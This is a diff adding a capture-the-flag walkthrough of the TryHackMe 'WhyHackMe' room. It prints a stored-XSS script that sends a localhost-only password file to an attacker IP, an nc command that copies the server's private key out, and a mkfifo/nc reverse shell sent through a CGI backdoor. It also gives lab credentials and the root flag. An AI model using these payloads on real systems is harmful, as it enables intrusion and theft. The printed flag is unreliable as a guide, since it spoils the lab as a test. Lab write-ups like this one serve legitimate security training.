@@ -1,0 +1,249 @@
+TryHackMe: WhyHackMe – Full Walkthrough
+Overview
+WhyHackMe is a medium-difficulty room that combines web exploitation (XSS data exfiltration), privilege escalation via iptables, and decryption of TLS traffic to gain a reverse shell and finally root access.
+
+Techniques used:
+
+Anonymous FTP enumeration
+
+Stored XSS to steal localhost-only credentials
+
+SSH access as jack
+
+Iptables rule modification to expose a hidden HTTPS backdoor
+
+TLS decryption with server private key
+
+Command injection via CGI script
+
+Sudo misconfiguration (NOPASSWD: ALL) to become root
+
+Flags:
+
+User flag: found in jack home directory (33 chars)
+
+Root flag: 4dbe2259ae53846441cc2479b5475c72
+
+1. Initial Enumeration
+Nmap Scan
+bash
+nmap -T4 -n -sC -sV -Pn -p- 10.49.181.55
+Open ports:
+
+21/tcp – vsftpd 3.0.3 (anonymous login allowed)
+
+22/tcp – OpenSSH 8.2p1
+
+80/tcp – Apache httpd 2.4.41
+
+41312/tcp – filtered (hidden later)
+
+FTP – Anonymous Login
+bash
+ftp 10.49.181.55
+# Login: anonymous, password: (empty)
+List and download update.txt:
+
+bash
+ftp> ls
+-rw-r--r-- 1 0 0 318 Mar 14 2023 update.txt
+ftp> get update.txt
+Contents of update.txt:
+
+text
+Hey I just removed the old user mike because that account was compromised and for any
+of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry
+this file is only accessible by localhost(127.0.0.1), so nobody else can view it except
+me or people with access to the common account. 
+- admin
+The file /dir/pass.txt is only reachable from localhost. We need to force the admin (or any internal user) to fetch it for us.
+
+2. Web Enumeration & XSS Discovery
+Directory Fuzzing
+bash
+gobuster dir -u http://10.49.181.55 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
+Relevant findings:
+
+/index.php
+
+/blog.php – comment section
+
+/login.php
+
+/register.php
+
+/dir – 403 Forbidden (matches update.txt hint)
+
+/assets
+
+Creating an Account
+/register.php allows new user registration. The username field is later displayed on /blog.php when leaving comments.
+
+XSS in Username
+Register a user with a simple XSS payload as username:
+
+html
+<script>alert(1)</script>
+Log in and post any comment. The alert triggers – the username is not sanitized and is rendered in the comments section.
+
+Since the admin (admin user) monitors comments, any XSS payload will be executed in the admin's browser.
+
+XSS Payload to Exfiltrate /dir/pass.txt
+We need a JavaScript payload that makes the admin's browser fetch http://127.0.0.1/dir/pass.txt and send the content back to our attacker machine.
+
+Payload (exfil.js):
+
+javascript
+// XSS Data Exfiltration
+var uri = "/dir/pass.txt";
+var xhr = new XMLHttpRequest();
+xhr.open("GET", uri, true);
+xhr.send(null);
+xhr.onreadystatechange = function() {
+  if (xhr.readyState == XMLHttpRequest.DONE) {
+    var data = btoa(xhr.responseText);
+    var img = new Image();
+    img.src = "http://192.168.145.49:9000/exfil/LAST/" + data + ".jpg";
+  }
+}
+Serve the payload:
+
+bash
+python3 -m http.server 9000
+Register a new user with the XSS payload as username:
+
+html
+<script src="http://192.168.145.49:9000/exfil.js"></script>
+Then log in and post a comment. The admin will visit the blog, load our script, and exfiltrate the file.
+
+Receiving the Exfiltrated Data
+In the HTTP server logs we see:
+
+text
+10.49.181.55 - - [18/Apr/2026 03:39:03] "GET /exfil/LAST/amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
+The Base64 string decodes to:
+
+text
+jack:WhyIsMyPasswordSoStrongIDK
+Credentials obtained!
+
+3. SSH Access as jack
+bash
+ssh jack@10.49.181.55
+# Password: WhyIsMyPasswordSoStrongIDK
+User flag:
+
+bash
+jack@ubuntu:~$ wc -c user.txt
+33 user.txt
+4. Privilege Escalation – Opening the Hidden Backdoor
+Investigating /opt
+bash
+jack@ubuntu:/opt$ cat urgent.txt
+Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
+Files in /opt:
+
+urgent.txt
+
+capture.pcap
+
+We also note a directory /usr/lib/cgi-bin/ with strange permissions:
+
+text
+drwxr-x---  2 root h4ck3d 4.0K Aug 16  2023 cgi-bin
+Iptables Rule Blocking Port 41312
+Check current iptables rules:
+
+bash
+jack@ubuntu:~$ sudo /usr/sbin/iptables -L --line-numbers
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination
+1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
+...
+User jack can run iptables with sudo:
+
+bash
+jack@ubuntu:~$ sudo -l
+...
+User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
+Replace the DROP rule with ACCEPT:
+
+bash
+sudo /usr/sbin/iptables -R INPUT 1 -p tcp --dport 41312 -j ACCEPT
+Verify:
+
+bash
+sudo /usr/sbin/iptables -L --line-numbers
+1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
+Now port 41312 is reachable.
+
+5. Decrypting the PCAP to Find the Backdoor Command
+The capture.pcap contains TLS-encrypted traffic. The private key for the HTTPS server is needed.
+
+Locate the Apache SSL Key
+Check Apache configuration:
+
+bash
+jack@ubuntu:~$ cat /etc/apache2/sites-enabled/000-default.conf
+We see:
+
+text
+SSLCertificateKeyFile /etc/apache2/certs/apache.key
+Download the key to our attacker machine:
+
+bash
+# On attacker: nc -lvnp 8000 > apache.key
+# On target:
+nc -q 0 192.168.145.49 8000 < /etc/apache2/certs/apache.key
+Decrypt PCAP in Wireshark
+Open capture.pcap
+
+Edit → Preferences → Protocols → TLS
+
+Add the apache.key (RSA keys list)
+
+Filter: http
+
+We see a request:
+
+text
+GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
+This is a command injection endpoint.
+
+6. Gaining Reverse Shell as www-data
+Start Netcat Listener
+On attacker:
+
+bash
+nc -lvnp 4444
+Send Reverse Shell via Backdoor
+bash
+curl -k 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.145.49 4444 >/tmp/f'
+We get a shell:
+
+text
+www-data@ubuntu:/usr/lib/cgi-bin$ ls
+5UP3r53Cr37.py
+7. Root Escalation via Sudo
+Check sudo privileges for www-data:
+
+bash
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL
+www-data can run any command as root without password.
+
+Become root:
+
+bash
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo su -
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+Root Flag
+bash
+root@ubuntu:~# cat /root/root.txt
+4dbe2259ae53846441cc2479b5475c72
